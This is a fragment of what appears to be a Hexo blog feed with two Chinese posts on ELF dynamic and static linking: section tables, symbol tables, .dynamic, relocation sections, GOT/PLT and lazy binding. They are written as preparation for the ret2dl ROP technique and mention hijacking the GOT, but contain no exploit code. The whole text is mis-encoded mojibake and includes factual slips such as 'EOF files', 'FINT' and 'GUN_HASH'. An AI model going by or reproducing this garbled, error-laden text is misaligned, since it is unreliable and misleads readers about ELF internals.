Headerï¼Œè€Œæˆ‘è§‰å¾—è¿™ä¸ªéƒ¨åˆ†åŠŸèƒ½ä¸Šæ›´æ¥è¿‘SHTï¼Œæœ‰ç€å’ŒSHTç›¸ä¼¼çš„åŠŸèƒ½ï¼Œéƒ½æ˜¯å¸®åŠ©æˆ‘ä»¬å¯»æ‰¾åˆ°sectionçš„ï¼Œæˆ–è®¸å¯ä»¥è¯´æ˜¯äºŒè€…çš„ç»“åˆã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727162459172.png" alt="&#39;.dynamic&#39;"></p><p>å…¶ç»“æ„ä½“ä¸º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><table><thead><tr><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>NEEDED</td><td>ä¾èµ–çš„å…±äº«å¯¹è±¡æ–‡ä»¶</td></tr><tr><td>INIT</td><td>åˆå§‹åŒ–ä»£ç åœ°å€ï¼Œä¹Ÿå°±æ˜¯.initçš„ä½ç½®</td></tr><tr><td>FINT</td><td>æ˜¯ç»“æŸä»£ç åœ°å€ï¼Œä¹Ÿå°±æ˜¯.finiçš„ä½ç½®</td></tr><tr><td>GUN_HASH</td><td>åŠ¨æ€é“¾æ¥å“ˆå¸Œè¡¨åœ°å€</td></tr><tr><td>STRTAB</td><td>åŠ¨æ€é“¾æ¥å­—ç¬¦ä¸²è¡¨çš„ä½ç½®ï¼Œè¡¨ç¤º.dynstrçš„ä½ç½®</td></tr><tr><td>SYMTAB</td><td>åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨çš„ä½ç½®,è¡¨ç¤º.dynsymçš„ä½ç½®;</td></tr><tr><td>PLTGOT</td><td>æŒ‡å‘.gotçš„ä½ç½®</td></tr><tr><td>JMPREL</td><td>è¡¨ç¤ºé‡å®šä½è¡¨ï¼Œä¹Ÿå°±æ˜¯.rel.plt</td></tr><tr><td>REL\RELA</td><td>è¡¨ç¤ºåŠ¨æ€é“¾æ¥é‡å®šä½è¡¨çš„ä½ç½®;RELENT/RELAENTè¡¨ç¤ºåŠ¨æ€é‡è¯»ä½è¡¨å…¥å£æ•°é‡</td></tr></tbody></table><p>åœ¨é™æ€é“¾æ¥ä¸­æˆ‘ä»¬æ˜¯é€šè¿‡</p><h2 id="â€œ-dynsymâ€-â€-dynstrâ€-amp-â€-hashâ€"><a href="#â€œ-dynsymâ€-â€-dynstrâ€-amp-â€-hashâ€" class="headerlink" title="â€œ.dynsymâ€,â€.dynstrâ€&amp;â€.hashâ€"></a>â€œ.dynsymâ€,â€.dynstrâ€&amp;â€.hashâ€</h2><p>åœ¨é™æ€é“¾æ¥ä¸­æœ‰ä¸€ä¸ªä¸“é—¨çš„æ®µå«åš<em><strong>.symtab</strong></em>,é‡Œé¢ä¿å­˜äº†æ‰€æœ‰å…³äºè¯¥ç›®æ ‡çš„ç¬¦å·çš„å®šä¹‰å’Œå¼•ç”¨.è€Œä¸ºäº†è¡¨ç¤ºåŠ¨æ€é“¾æ¥æ¨¡å—é—´çš„ç¬¦å·å¯¼å…¥å¯¼å‡ºå…³ç³»,ELFä¸“é—¨æœ‰ä¸€ä¸ªå«åš<strong>åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨</strong>çš„æ®µç”¨æ¥ä¿å­˜è¿™äº›ä¿¡æ¯,ä¹Ÿå°±æ˜¯<em><strong>.dynsym</strong></em>.</p><p>é‡è¦çš„æ˜¯â€.dynsymâ€åªä¿å­˜äº†åŠ¨æ€é“¾æ¥ç›¸å…³çš„ç¬¦å·,è€Œæ¨¡å—å†…ç§æœ‰çš„å˜é‡åˆ™ä¸ä¼šä¿å­˜ï¼Œè¿™ä¸€ç‚¹å’Œé™æ€é“¾æ¥ä¸­ç¬¦å·è¡¨æ˜¯ç›¸ä¼¼çš„.é€šå¸¸åŠ¨æ€é“¾æ¥çš„æ¨¡å—åŒæ—¶åŒ…å«:â€.symtabâ€å’Œâ€ã€‚â€.dynsmâ€œè¿™ä¸¤ä¸ªæ®µã€‚â€.symtabâ€åŒ…å«æ‰€æœ‰çš„ç¬¦å·,ä¹ŸåŒ…æ‹¬â€.dynsymâ€ä¸­çš„ç¬¦å·.</p><p>â€œ.strtabâ€,ä¸€ä¸ªç”¨äºä¿å­˜ç¬¦å·åçš„å­—ç¬¦ä¸²è¡¨.è€Œâ€.cybsymâ€å¯¹åº”çš„å°±æ˜¯åŠ¨æ€ç¬¦å·å­—ç¬¦ä¸²è¡¨</p><p><em><strong>.dynstr</strong></em>.ç”¨äºåŠ¨æ€é“¾æ¥ä¸­æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºè¿è¡Œçš„æ—¶å€™æŸ¥æ‰¾ç¬¦å·,ä¸ºäº†åŠ å¿«ç¬¦å·çš„æŸ¥æ‰¾è¿‡ç¨‹,å¾€å¾€é€šè¿‡<strong>ç¬¦å·å“ˆå¸Œè¡¨</strong>â€”<em><strong>.hash</strong></em>æ¥åŠ å¿«ç¬¦å·æŸ¥æ‰¾é€Ÿåº¦ï¼Œè¿™ä¸ªæ˜¯åŠ¨æ€é“¾æ¥ç‹¬æœ‰çš„.</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170027080.png" alt="&#39;.dynsym&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727170510147.png" alt="&#39;.hash&#39;"></p><h2 id="â€œ-rel-dynâ€-amp-â€-rel-pltâ€"><a href="#â€œ-rel-dynâ€-amp-â€-rel-pltâ€" class="headerlink" title="â€œ.rel.dynâ€&amp;â€.rel.pltâ€"></a>â€œ.rel.dynâ€&amp;â€.rel.pltâ€</h2><p>é™æ€é“¾æ¥ä¸­æœ‰<em><strong>.rel.text</strong></em>(ä»£ç æ®µé‡å®šä½è¡¨)å’Œ<em><strong>.rel.data</strong></em>(æ•°æ®æ®µé‡å®šä½è¡¨)ä½œä¸ºé™æ€é“¾æ¥ä¸­ç”¨äºè¡¨ç¤ºé‡å®šä½ä¿¡æ¯çš„é‡å®šä½è¡¨.</p><p>åœ¨åŠ¨æ€é“¾æ¥ä¸­è‡ªç„¶ä¹Ÿæœ‰ä¸ä¹‹å¯¹åº”çš„é‡å®šä½è¡¨<em><strong>.rel.dyn</strong></em>,<em><strong>.rel,plt</strong></em>.â€rel.dtnâ€å®é™…ä¸Šæ˜¯å¯¹æ•°æ®å¼•ç”¨çš„ä¿®æ­£,å®ƒæ‰€ä¿®æ­£çš„ä½ç½®ä½äºâ€.gotâ€ä»¥åŠæ•°æ®æ®µ;è€Œâ€.rel.pltâ€æ˜¯å¯¹å‡½æ•°å¼•ç”¨çš„ä¿®æ­£,å®ƒæ‰€ä¿®æ­£çš„ä½ç½®ä½äºâ€.got.pltâ€.</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180200847.png" alt="&#39;.rel.fyn&#39;&amp;&#39;.rel.plt&#39;"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210727180447657.png" alt="SHT"></p><h1 id="åŠ¨æ€é“¾æ¥å’Œé™æ€é“¾æ¥ä¸åŒä»¥åŠè§£å†³æ–¹æ³•"><a href="#åŠ¨æ€é“¾æ¥å’Œé™æ€é“¾æ¥ä¸åŒä»¥åŠè§£å†³æ–¹æ³•" class="headerlink" title="åŠ¨æ€é“¾æ¥å’Œé™æ€é“¾æ¥ä¸åŒä»¥åŠè§£å†³æ–¹æ³•"></a>åŠ¨æ€é“¾æ¥å’Œé™æ€é“¾æ¥ä¸åŒä»¥åŠè§£å†³æ–¹æ³•</h1><p>åŠ¨æ€é“¾æ¥å’Œé™æ€é“¾æ¥ç›¸åŒéœ€è¦è§£å†³ç¬¦å·è§£æå’Œé‡å®šä½çš„é—®é¢˜ï¼Œè¿™éƒ¨åˆ†å’Œé™æ€é“¾æ¥æ˜¯å·®ä¸å¤šçš„ï¼Œåªæœ‰å…¶æŒ‡ä»¤ä¿®æ­£æ–¹å¼ä¼šæœ‰æ‰€ä¸åŒã€‚æœ€å¤§çš„é—®é¢˜åœ¨äºï¼š<strong>ç”±äºå…¶å…±äº«åº“æ•°é‡ä¸èƒ½ç¡®å®šï¼Œæˆ‘ä»¬ä¸å¯èƒ½è¿›è¡ŒSegement åˆå¹¶</strong>ï¼Œå½“åŠ è½½å¤šä¸ªå…±äº«åº“æ—¶ï¼Œæ‰€æœ‰çš„å…±äº«åº“éƒ½éœ€è¦é©»ç•™åœ¨Mmapä¸­ï¼Œç‹¬è‡ªå æœ‰ä¸€å—ç©ºé—´ã€‚å› æ­¤å…±äº«åº“éœ€è¦æ”¯æŒä»»æ„åœ°å€è¢«åŠ è½½ï¼Œå…±äº«åº“çš„èµ·å§‹ä½ç½®åªæœ‰å½“è¿è¡Œçš„æ—¶å€™æ‰ä¼šè¢«ç¡®å®šã€‚</p><h2 id="ä½ç½®æ— å…³ä»£ç -PIC"><a href="#ä½ç½®æ— å…³ä»£ç -PIC" class="headerlink" title="ä½ç½®æ— å…³ä»£ç (PIC)"></a>ä½ç½®æ— å…³ä»£ç (PIC)</h2><h3 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h3><p>ä¸ºäº†å¯ä»¥è§£å†³åŠ¨æ€é“¾æ¥ä¸­å‡ºç°çš„è¿™äº›é—®é¢˜ï¼Œè¿™é‡Œé‡‡å–PICæŠ€æœ¯ã€‚PICçš„å®ç°ä¾èµ–äºä¸€ä¸ªäº‹å®ï¼šEOFæ–‡ä»¶çš„Segmentæ˜¯æŒ‰ç…§å®ƒä»¬åœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„ç»“æ„è¢«å¤åˆ¶åˆ°è¿è¡Œå†…å­˜çš„ã€‚è¿™ä¸€ç‚¹å¯èƒ½å¯¹äºæˆ‘ä»¬æ¥è¯´å¸ç©ºè§æƒ¯äº†ï¼ŒEOFæ–‡ä»¶ä¸­ä»»ä½•ä¸€ä¸ªä»˜å·å¯¹äºæ–‡ä»¶çš„åç§»åœ¨åŠ è½½åˆ°å†…å­˜åéƒ½æ˜¯å›ºå®šçš„ã€‚ç„¶è€Œè¿™æ˜¯å®ç°PICçš„å…³é”®æ‰€åœ¨ï¼Œå› ä¸ºè¿™æ ·çš„è¯ï¼Œ<strong>ä»»ä½•ä¸¤ä¸ªç¬¦å·ä¹‹é—´çš„åç§»å°±ä¼šå˜æˆä¸€ä¸ªå›ºå®šçš„å€¼</strong>ã€‚</p><p>PICé€šè¿‡<strong>å…¨å±€åç§»è¡¨</strong>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»å¸¸åŠ«æŒçš„GOTè¡¨æ¥å®ç°ï¼ŒGOTè¢«å‚¨å­˜åœ¨.dataæ®µä¸­ï¼Œæ­£å¦‚æˆ‘ä»¬ä¸Šé¢æ‰€è¯´çš„å…¶å…³äº.textçš„åç§»æ˜¯å›ºå®šçš„ã€‚å½“GOTè¡¨åœ¨ç£ç›˜ä¸Šçš„æ—¶å€™å…¶å€¼æ˜¯ä¸ºç©ºçš„ï¼Œåªæœ‰å½“EOFæ–‡ä»¶è¢«åŠ è½½åˆ°å†…å­˜åï¼Œæ‰æœ‰å¯èƒ½è®©åŠ¨æ€é“¾æ¥å™¨æ ¹æ®é‡å®šä½è¡¨å’Œç¬¦å·è¡¨æ‰¾åˆ°ç¬¦å·çš„ç»å¯¹åœ°å€ï¼Œå°†å…¶å†™å…¥gotè¡¨ã€‚</p><h3 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h3><p>GOTè§£å†³äº†å…±äº«åº“çš„å…¨å±€å˜é‡å¼•ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜è¦å¤„ç†å‡½æ•°è°ƒç”¨ã€‚è¿™é‡Œå°±éœ€è¦<strong>å‡½æ•°é“¾æ¥è¡¨</strong>ï¼šPLTè¡¨ã€‚</p><p>å› ä¸ºæˆ‘ä»¬ä¸å¯ä»¥ä¿®æ”¹.textæ®µï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é‡‡ç”¨GOTåŠ PLTçš„æ–¹æ³•ï¼ŒPLTè¡¨è·³è½¬çš„ä½ç½®æŒ‡å‘GOTè¡¨å‚¨å­˜çš„åœ°å€ã€‚</p><h3 id="å»¶è¿Ÿç»‘å®š"><a href="#å»¶è¿Ÿç»‘å®š" class="headerlink" title="å»¶è¿Ÿç»‘å®š"></a>å»¶è¿Ÿç»‘å®š</h3><p>ELFä¸‹çš„<strong>å»¶è¿Ÿç»‘å®š</strong>è¿‡ç¨‹â€”â€”<em><strong>PLT</strong></em>ï¼Œåœ¨ELFæ–‡ä»¶ä¸­å½“æˆ‘ä»¬è°ƒç”¨å‡½æ•°éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªå«åšPLTé¡¹çš„ç»“æ„æ¥è¿›è¡Œè·³è½¬çš„ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªbar()å‡½æ•°ï¼Œå…¶åœ¨PLTä¸­çš„åœ°å€æˆ‘ä»¬ç§°ä¸ºbar@PLTã€‚é‚£ä¹ˆå…¶å®ç°ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">push moduleID</span><br><span class="line">jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>bar@pltçš„ç¬¬ä¸€æ¡é€šè¿‡GOTé—´æ¥è·³è½¬æŒ‡ä»¤ï¼Œå‡è®¾æˆ‘ä»¬å·²ç»è¿›è¡Œè¿‡å»¶è¿Ÿç»‘å®šï¼Œæ­¤æ—¶bar@GOTé‡Œå­˜æ”¾è¿™æˆ‘ä»¬çœŸæ­£çš„barå‡½æ•°å¯¹åº”çš„é¡¹ï¼Œé‚£ä¹ˆè¿™ä¸ªè·³è½¬æŒ‡ä»¤è‡ªç„¶ä¼šè·³è½¬åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¿˜æ²¡æœ‰è¿›è¡Œè¿‡å»¶è¿Ÿç»‘å®šé‚£ï¼Œé‚£ä¹ˆæ­¤æ—¶è¿™é‡Œå­˜æ”¾çš„å¿…å®šä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œ<strong>æ­¤æ—¶bar@GOTå­˜æ”¾çš„å…¶å®æ˜¯bar@pltçš„ç¬¬äºŒæ¡æŒ‡ä»¤</strong>ï¼Œç¬¬äºŒæ¡æŒ‡ä»¤æ˜¯å°†ä¸€ä¸ªæ•°å­—nå‹å…¥æ ˆé‡Œï¼Œè€Œè¿™ä¸ªæ•°å­—æ˜¯<strong>barè¿™ä¸ªç¬¦å·å¼•ç”¨åœ¨é‡å®šä½è¡¨â€.rel.pltâ€çš„ä¸‹æ ‡</strong>ã€‚æ¥ä¸‹æ¥åˆä¸€ä¸ªpushå°†æŒ‡ä»¤æ¨¡å—çš„IDå‹å…¥æ ˆä¸­ï¼Œæœ€åå†è·³è½¬åˆ°**_dl_runtime_resolve**ã€‚</p><p>å½“bar()è¿™ä¸ªå‡½æ•°è¢«è§£æè¿‡ä¸€æ¬¡ï¼Œé‚£ä¹ˆä¸‹æ¬¡è°ƒç”¨å°±ä¸ç”¨å†æ¬¡é‡å®šä½ï¼Œåªéœ€è¦ç›´æ¥è·³è½¬åˆ°bar()å‡½æ•°ä¸­ã€‚ELFå°†GOTæ‹†ä¸ºä¸¤ä¸ªè¡¨â€.gotâ€å’Œ â€œ.got.pltâ€ï¼Œå…¶ä¸­â€.gotâ€æ¥æŠ¥å­˜å…¨å±€å˜é‡å¼•ç”¨åœ°å€ï¼Œâ€.got.pltâ€ä¿å­˜å‡½æ•°å¼•ç”¨åœ°å€ã€‚</p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>ä»¥ä¸ŠåŸºæœ¬é˜è¿°äº†åŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹ï¼Œæ¥ä¸‹æ¥å°±æ˜¯**_dl_runtime_resolve**è¿™ä¸ªå‡½æ•°çš„é—®é¢˜äº†ã€‚è¿™ä¸ªç•™åœ¨ret2dlå†è®¨è®ºå§</p>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> link </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ret2dlæœ‰å…³çš„å‰ç½®çŸ¥è¯†-link</title>
      <link href="/2021/08/09/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-link/"/>
      <url>/2021/08/09/%E4%B8%8Eret2dl%E6%9C%89%E5%85%B3%E7%9A%84%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-link/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æˆ‘ä»¬ropé‡Œæœ‰ä¸€ç§é«˜çº§çš„æ”»å‡»æ–¹æ³•ret2dlï¼Œå®ƒå’ŒåŠ¨æ€é“¾æ¥æœ‰å…³ï¼Œåœ¨æˆ‘å»å­¦ä¹ ret2dlæ—¶å‘ç°è‡ªå·±å¯¹ELFæ–‡ä»¶ä¸­çš„ä¸€äº›sectionä¸æ˜¯é‚£ä¹ˆç†Ÿæ‚‰ï¼Œè€Œä¸”ä¸äº†è§£é™æ€é“¾æ¥æ˜¯æ€ä¹ˆå®Œæˆçš„ï¼Œå¯¹åŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹æœ‰äº›ä¸çŸ¥æ‰€æªï¼Œè¿™é‡Œæ€»ç»“ä¸€ä¸‹æœ€è¿‘å­¦ä¹ çš„é™æ€é“¾æ¥ä»¥åŠå…¶ç›¸å…³sectionå¯¹ret2dlåšä¸€äº›è¡¥å……è¯´æ˜ã€‚æˆ‘è¿™é‡Œåªè¡¨è¿°æˆ‘è®¤ä¸ºçš„é™æ€é“¾æ¥æœ€ä¸ºå…³é”®çš„éƒ¨åˆ†ï¼Œå¦‚æœå¯¹å…¶ä»–æ–¹é¢æœ‰å…´è¶£å¯ä»¥åœ¨å‚è€ƒéƒ¨åˆ†å¯»æ‰¾éœ€è¦çš„èµ„æ–™ã€‚</p><h1 id="ELFç»“æ„"><a href="#ELFç»“æ„" class="headerlink" title="ELFç»“æ„"></a>ELFç»“æ„</h1><p>ELFæ–‡ä»¶æœ€å‰æ–¹çš„æ˜¯<strong>ELFæ–‡ä»¶å¤´</strong> (<strong>ELF Header</strong>)ï¼ŒåŒ…å«ç€æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ELFæ–‡ä»¶çš„å„ç§æ®µã€‚åœ¨è¿™äº›ä¸åŒçš„æ®µä¸­æœ€ä¸ºé‡è¦çš„å°±æ˜¯<strong>æ®µè¡¨</strong>(<strong>section Header Table</strong>)ï¼Œä¹Ÿå°±æ˜¯<em><strong>SHT</strong></em>ï¼Œè¿™ä¸ªæ®µè¡¨è¿°äº†ELFæ–‡ä»¶ä¸­åŒ…å«çš„æ‰€æœ‰æ®µä¿¡æ¯ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809165314132.png" alt="ELFç»“æ„"></p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹é“¾æ¥å™¨æ˜¯å¦‚ä½•åˆ†æä¸€ä¸ªELFæ–‡ä»¶çš„</p><h1 id="é™æ€é“¾æ¥çš„é‡è¦sectionï¼Œä»¥åŠé“¾æ¥å™¨çš„åˆ†æ"><a href="#é™æ€é“¾æ¥çš„é‡è¦sectionï¼Œä»¥åŠé“¾æ¥å™¨çš„åˆ†æ" class="headerlink" title="é™æ€é“¾æ¥çš„é‡è¦sectionï¼Œä»¥åŠé“¾æ¥å™¨çš„åˆ†æ"></a>é™æ€é“¾æ¥çš„é‡è¦sectionï¼Œä»¥åŠé“¾æ¥å™¨çš„åˆ†æ</h1><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">readelf -h &lt;file name&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„å‘½ä»¤æ¥æŸ¥çœ‹ä¸€ä¸ªELFæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œè¿™é‡Œä¸å¦¨æŸ¥çœ‹libcçš„ELF Header</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809170056849.png" alt="ELF Header"></p><p>é€šè¿‡ä¸Šå›¾å¯ä»¥çœ‹åˆ°ELFæ–‡ä»¶é‡Œå®šä¹‰äº†å¾ˆå¤šä¸œè¥¿ï¼ŒåŒ…æ‹¬é­”æ•°ã€æ–‡ä»¶æœºå™¨å­—èŠ‚é•¿åº¦ã€å‚¨å­˜æ–¹å¼ç­‰ä¿¡æ¯ï¼Œè€Œè¿™é‡Œå¯¹æˆ‘ä»¬é™æ€é“¾æ¥è¿‡ç¨‹ä¸­æœ€ä¸ºé‡è¦çš„å°±æ˜¯<strong>Start of section headers</strong>ï¼Œè¿™é‡Œæ˜¯æˆ‘ä»¬æ®µè¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»ï¼Œé€šè¿‡ä¸Šå›¾æˆ‘ä»¬çŸ¥é“æ®µè¡¨åœ¨æ–‡ä»¶çš„ç¬¬1864377å­—èŠ‚å¼€å§‹ã€‚è€Œé“¾æ¥å™¨ä¹Ÿä¼šé€šè¿‡è¯¥é¡¹æ‰¾åˆ°æˆ‘ä»¬SHTçš„ä½ç½®ã€‚</p><h2 id="Section-Header-Table-SHT"><a href="#Section-Header-Table-SHT" class="headerlink" title="Section Header Table(SHT)"></a>Section Header Table(SHT)</h2><p>æˆ‘ä»¬çš„ELFæ–‡ä»¶ä¸­æœ‰å„ç§å„æ ·çš„ä¸åŒæ®µï¼Œè€Œæ®µè¡¨å°±æ˜¯è®°å½•è¿™äº›æ®µçš„åŸºæœ¬ï¼Œé€šè¿‡ä¸Šé¢æŸ¥çœ‹çš„ELF Headerå¯ä»¥å¾—åˆ°æ®µè¡¨çš„èµ·å§‹ä½ç½®ä¸º1864377 Bytesï¼Œæ¯ä¸ªè¡¨é¡¹å¤§å°æ˜¯64 Bytesï¼Œä¸€å…±æ˜¯72é¡¹</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">readelf -S &lt;file name&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„å‘½ä»¤æ¥æŸ¥çœ‹æ¯ä¸ªæ®µçš„å…·ä½“ä¿¡æ¯</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210809175848346.png" alt="SHT"></p><p>SHTæ¯é¡¹åŒ…å«</p><table><thead><tr><th>æˆå‘˜</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>sh_name</td><td>Section nameï¼šè¿™é‡Œå­˜æ”¾çš„æ˜¯å…¶nameå­—ç¬¦åœ¨å­—ç¬¦ä¸²è¡¨çš„åç§»</td></tr><tr><td>sh_type</td><td>Section typeï¼šè¡¨ç¤ºè¯¥æ®µçš„ç±»å‹ï¼Œä¾‹å¦‚.textæ˜¯ç¨‹åºæ®µ</td></tr><tr><td>sh_flag</td><td>Section flagï¼šè¡¨ç¤ºè¯¥æ®µçš„æ ‡å¿—ä½</td></tr><tr><td>sh_addr</td><td>Section Addressï¼šæ®µè™šæ‹Ÿåœ°å€</td></tr><tr><td>sh_offset</td><td>Section Offsetï¼šæ®µåç§» è¡¨ç¤ºè¯¥æ®µåœ¨æ–‡ä»¶ä¸­çš„åç§»</td></tr><tr><td>sh_size</td><td>Section Sizeï¼šè¯¥æ®µé•¿åº¦</td></tr><tr><td>sh_link</td><td>Section Linkï¼šé“¾æ¥æœ‰å…³æ®µä¸“å±,æ®µé“¾æ¥ä¿¡æ¯</td></tr><tr><td>sh_info</td><td>Section informationï¼šåŒä¸Š</td></tr><tr><td>sh_addralign</td><td>Section Address Alignmentï¼šæ®µåœ°å€å¯¹é½æ–¹å¼</td></tr><tr><td>sh_entsize</td><td>Section Entry Sizeï¼šå¦‚æœè¯¥æ®µæœ‰ä¸€äº›å›ºå®šå¤§å°é¡¹ï¼Œè¿™é‡Œå±•ç¤ºæ¯é¡¹çš„å¤§å°</td></tr></tbody></table><p>æœ‰äº†è¿™ä¸ªSHTæˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°ä»»ä½•ä¸€ä¸ªæƒ³è¦æ‰¾åˆ°çš„sectionåœ¨å“ªé‡Œäº†ã€‚è¿™é‡Œé“¾æ¥å™¨å°±å¯ä»¥çŸ¥é“æ‰€æœ‰æ®µçš„ä½ç½®å’Œé•¿åº¦ã€‚è€Œä»…ä»…æ‰¾åˆ°æ¯ä¸ªæ®µçš„ä½ç½®æ˜¯ä¸è¶³ä»¥è®©æ¥é“¾æ¥å™¨å®Œæˆé“¾æ¥çš„å·¥ä½œçš„ï¼Œæˆ‘ä»¬ä¸èƒ½å•å•æ˜¯æŠŠç›¸ä¼¼çš„sectionåˆå¹¶äº†äº‹ã€‚</p><p>åœ¨runtimeé˜¶æ®µï¼Œæˆ‘ä»¬è¦è°ƒç”¨ä¸€ä¸ªå˜é‡æˆ–è€…å‡½æ•°æ˜¯éœ€è¦çŸ¥é“è¯¥å‡½æ•°æˆ–è€…æ˜¯å˜é‡çš„ä½ç½®çš„ï¼Œè¿™é‡Œå°±éœ€è¦</p><p>å¯¹ç¬¦å·è¿›è¡Œåˆ†æã€‚è¿™é‡Œä¹Ÿéœ€è¦ä¸€ä¸ªè¡¨æ¥å¯»æ‰¾ä¸åŒçš„ç¬¦å·ï¼Œå»å¯¹ç¬¦å·è¿›è¡Œè§£æã€‚</p><h2 id="symbol-Table"><a href="#symbol-Table" class="headerlink" title="symbol Table"></a>symbol Table</h2><p>å¦‚æœæˆ‘ä»¬è¦å®šä½åˆ°æ¯ä¸ªç¬¦å·åœ¨ELFä¸­çš„ä½ç½®ï¼Œè¿™å°±éœ€è¦ä¸€ä¸ªsectionæ¥è¡¨è¿°è¿™äº›ç¬¦å·ï¼Œä¹Ÿå°±æ˜¯<strong>.symtab</strong>(<strong>ç¬¦å·è¡¨</strong>)ã€‚æˆ‘ä»¬çŸ¥é“Cè¯­è¨€ä¸éš¾åœ¨å‡½æ•°çš„å†…éƒ¨å†æ¬¡å®šä¹‰å‡½æ•°ï¼Œæ‰€ä»¥ä¸€ä¸ªELFæ–‡ä»¶å¹³åˆ†ä¸ºä¸¤å±‚ï¼šå‡½æ•°çš„å†…éƒ¨ã€å‡½æ•°å¤–éƒ¨ã€‚<strong>å¤–éƒ¨çš„</strong>å‡½æ•°å’Œå˜é‡æ˜¯å¯¹é“¾æ¥å¯è§çš„ï¼Œæ‰€ä»¥å®ƒä»¬å¯ä»¥è¢«å…¶ä»–çš„ELFæ–‡ä»¶æ‰€å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯ç¬¦å·ã€‚</p><table><thead><tr><th>æˆå‘˜</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>st_name</td><td>st_name ä¿å­˜äº†æŒ‡å‘ç¬¦å·è¡¨ä¸­å­—ç¬¦ä¸²è¡¨ï¼ˆä½äº.dynstr æˆ–è€….strtabï¼‰ çš„åç§»åœ°å€ï¼Œåç§»åœ°å€å­˜æ”¾ç€ç¬¦å·çš„åç§°ï¼Œå¦‚ printfã€‚</td></tr><tr><td>st_value</td><td>st_value å­˜æ”¾ç¬¦å·çš„å€¼ï¼ˆå¯èƒ½æ˜¯åœ°å€æˆ–è€…ä½ç½®åç§»é‡ï¼‰ã€‚</td></tr><tr><td>st_size</td><td>st_size å­˜æ”¾äº†ä¸€ä¸ªç¬¦å·çš„å¤§å°ï¼Œå¦‚å…¨å±€å‡½æ•°æŒ‡é’ˆçš„å¤§å°ï¼Œåœ¨ä¸€ä¸ª 32 ä½ ç³»ç»Ÿä¸­é€šå¸¸æ˜¯ 4 å­—èŠ‚ã€‚</td></tr><tr><td>st_other</td><td>st_other å˜é‡å®šä¹‰äº†ç¬¦å·çš„å¯è§æ€§ã€‚</td></tr><tr><td>st_shndx</td><td>æ¯ä¸ªç¬¦å·è¡¨æ¡ç›®çš„å®šä¹‰éƒ½ä¸æŸäº›èŠ‚å¯¹åº”ã€‚st_shndx å˜é‡ä¿å­˜äº†ç›¸å…³èŠ‚å¤´è¡¨çš„ç´¢å¼•ã€‚</td></tr><tr><td>st_info</td><td>st_info æŒ‡å®šç¬¦å·ç±»å‹åŠç»‘å®šå±æ€§ã€‚</td></tr></tbody></table><h3 id="st-info"><a href="#st-info" class="headerlink" 